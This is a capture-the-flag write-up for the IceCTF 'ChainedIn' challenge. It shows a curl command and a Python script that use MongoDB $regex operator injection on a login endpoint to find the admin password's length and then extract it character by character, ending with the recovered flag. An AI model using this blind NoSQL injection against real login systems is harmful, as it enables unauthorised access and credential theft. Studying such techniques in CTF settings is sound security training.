#ChainedIn WU

First we can see website use mongoDB thanks to the logo

Analyzing with firebug we can see data are sent as json.

So I try to inject admin login, password should be the flag and begins with "IceCTF{"

```
ghozt@maze:~/ice/chained$ curl -H "Content-Type: application/json" -X POST -d '{"user":"admin","pass":{"$regex":"IceCTF{"}}' http://chainedin.vuln.icec.tf/login
```

It Works ! Let's script !
<!-- more -->
```python
#!/usr/python

import requests
import json

url = "http://chainedin.vuln.icec.tf/login"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_"

print "[+] Getting password size ..."
for i in range(7, 100):
        payload = {'user':'admin','pass':{'$regex':'.{'+str(i)+'}'}}
        r = requests.post(url, json=payload)
        if "Invalid" in r.text:
                print "[+] Password size is "+str(i-1)
                size = i
                break

print "[+] Getting password"
password = "IceCTF{"
for i in range(7, size):
        for c in charset:
                payload = {'user':'admin','pass':{'$regex':password+c}}
                r = requests.post(url, json=payload)
                if "Administrator" in r.text:
                        password = password + c
                        print password
                        continue

```

And the result :

```
[+] Getting password size ...
[+] Password size is 55
[+] Getting password
IceCTF{I
IceCTF{I_
...
IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo}
```

Done !

By ghozt
